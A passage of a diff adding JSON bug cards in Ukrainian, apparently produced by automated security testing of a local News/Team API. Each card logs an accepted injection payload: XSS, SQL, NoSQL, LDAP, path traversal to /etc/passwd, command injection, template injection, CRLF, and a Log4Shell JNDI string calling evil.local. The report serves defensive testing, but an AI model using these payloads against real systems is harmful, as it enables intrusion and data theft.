+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 10 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <img src=x onerror=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 59,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-060",
+      "name": "BR-060: News → SQL_XSS Create news, ітерація 11: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 11 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <svg onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 60,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-061",
+      "name": "BR-061: News → SQL_XSS Create news, ітерація 12: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 12 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <body onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 61,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-062",
+      "name": "BR-062: News → SQL_XSS Create news, ітерація 13: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 13 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <iframe src=javascript:alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 62,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-063",
+      "name": "BR-063: News → SQL_XSS Create news, ітерація 14: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 14 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = javascript:alert(1)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 63,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-064",
+      "name": "BR-064: News → SQL_XSS Create news, ітерація 15: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 15 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <script>alert(document.cookie)</script>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 64,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-065",
+      "name": "BR-065: News → SQL_XSS Create news, ітерація 16: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 16 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <img src=x onerror=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 65,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-066",
+      "name": "BR-066: News → SQL_XSS Create news, ітерація 17: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 17 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <svg/onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 66,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-067",
+      "name": "BR-067: News → SQL_XSS Create news, ітерація 18: [NoSQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 18 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = {$ne: null}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 67,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-068",
+      "name": "BR-068: News → SQL_XSS Create news, ітерація 19: [NoSQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 19 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = [$gt]=`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 68,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-069",
+      "name": "BR-069: News → SQL_XSS Create news, ітерація 20: [LDAP Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «LDAP Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 20 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = *)(uid=*`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 69,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-070",
+      "name": "BR-070: News → SQL_XSS Create news, ітерація 21: [Path Traversal] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 21 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ../../../../etc/passwd`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 70,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-071",
+      "name": "BR-071: News → SQL_XSS Create news, ітерація 22: [Path Traversal] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 22 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ....//....//etc/passwd`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 71,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-072",
+      "name": "BR-072: News → SQL_XSS Create news, ітерація 23: [Command Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 23 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ; ls -la`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 72,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-073",
+      "name": "BR-073: News → SQL_XSS Create news, ітерація 24: [Command Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 24 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = | whoami`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 73,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-074",
+      "name": "BR-074: News → SQL_XSS Create news, ітерація 25: [Template Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 25 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ${7*7}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 74,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-075",
+      "name": "BR-075: News → SQL_XSS Create news, ітерація 26: [Template Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 26 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = <%= 7*7 %>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 75,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-076",
+      "name": "BR-076: News → SQL_XSS Create news, ітерація 27: [Log4Shell] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 27 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ${jndi:ldap://evil.local/a}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 76,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-077",
+      "name": "BR-077: News → SQL_XSS Create news, ітерація 28: [Log4Shell] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 28 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = ${jndi:ldap://evil.local/a}`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 77,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-078",
+      "name": "BR-078: News → SQL_XSS Create news, ітерація 29: [CRLF Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 29 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = admin%0d%0aSet-Cookie: x=1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 78,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-079",
+      "name": "BR-079: News → SQL_XSS Create news, ітерація 30: [CRLF Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 30 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = test%0d%0aX-Injected: true`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 79,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-080",
+      "name": "BR-080: News → SQL_XSS Create news, ітерація 31: [Null Byte] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Null Byte» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 31 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = news%00`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 80,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-081",
+      "name": "BR-081: News → SQL_XSS Create news, ітерація 32: [Homoglyph] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Homoglyph» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 32 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = Nеws with Cyrillic look-alikes`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 81,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-082",
+      "name": "BR-082: News → SQL_XSS Create news, ітерація 33: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 33 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 82,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-083",
+      "name": "BR-083: News → SQL_XSS Create news, ітерація 34: [Length] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 34 (News → SQL_XSS Create news)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/News`\n- Request body: `payload = bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb...(283 символів)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-8",
+      "pos": 83,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-084",
+      "name": "BR-084: Team → SQL_XSS Create team, ітерація 1: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 1 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ' OR '1'='1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 84,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-085",
+      "name": "BR-085: Team → SQL_XSS Create team, ітерація 2: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 2 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = admin'--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 85,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-086",
+      "name": "BR-086: Team → SQL_XSS Create team, ітерація 3: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 3 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = '; DROP TABLE Team;--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 86,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-087",
+      "name": "BR-087: Team → SQL_XSS Create team, ітерація 4: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 4 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ' OR SLEEP(5)--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 87,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-088",
+      "name": "BR-088: Team → SQL_XSS Create team, ітерація 5: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 5 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ' UNION SELECT NULL--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 88,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-089",
+      "name": "BR-089: Team → SQL_XSS Create team, ітерація 6: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 6 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ' OR '1'='1`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 89,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-090",
+      "name": "BR-090: Team → SQL_XSS Create team, ітерація 7: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 7 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = '; DROP TABLE Team;--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 90,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-091",
+      "name": "BR-091: Team → SQL_XSS Create team, ітерація 8: [SQL Injection] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 8 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = ' OR SLEEP(5)--`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 91,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-092",
+      "name": "BR-092: Team → SQL_XSS Create team, ітерація 9: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 9 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = <script>alert(1)</script>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 92,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-093",
+      "name": "BR-093: Team → SQL_XSS Create team, ітерація 10: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 10 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = <img src=x onerror=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 93,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-094",
+      "name": "BR-094: Team → SQL_XSS Create team, ітерація 11: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 11 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = <svg onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 94,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-095",
+      "name": "BR-095: Team → SQL_XSS Create team, ітерація 12: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 12 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = <body onload=alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 95,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-096",
+      "name": "BR-096: Team → SQL_XSS Create team, ітерація 13: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 13 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = <iframe src=javascript:alert(1)>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 96,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-097",
+      "name": "BR-097: Team → SQL_XSS Create team, ітерація 14: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 14 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = javascript:alert(1)`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 97,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
+      "id": "BR-098",
+      "name": "BR-098: Team → SQL_XSS Create team, ітерація 15: [XSS] payload не відхилено",
+      "desc": "**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.\n\n**Ітерація:** 15 (Team → SQL_XSS Create team)\n\n**Тіло:**\n- Endpoint: `POST http://localhost:8080/api/Team`\n- Request body: `payload = <script>alert(document.cookie)</script>`\n- Response: `201`\n\n**Очікуваний результат:** (порожньо)\n\n**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`",
+      "idList": "list-9",
+      "pos": 98,
+      "closed": false,
+      "due": null,
+      "dueComplete": false,
+      "labels": [
+        {
+          "name": "security",
+          "color": "red"
+        }
+      ]
+    },
+    {
